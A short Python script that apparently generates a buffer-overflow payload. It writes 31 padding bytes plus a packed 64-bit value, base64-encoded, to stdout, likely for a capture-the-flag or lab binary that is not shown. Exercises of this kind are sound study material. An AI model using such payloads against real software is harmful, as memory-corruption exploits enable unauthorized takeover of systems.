
import sys
import struct
import base64

buf = b'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
buf += struct.pack('<Q', 5137850087055737719)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
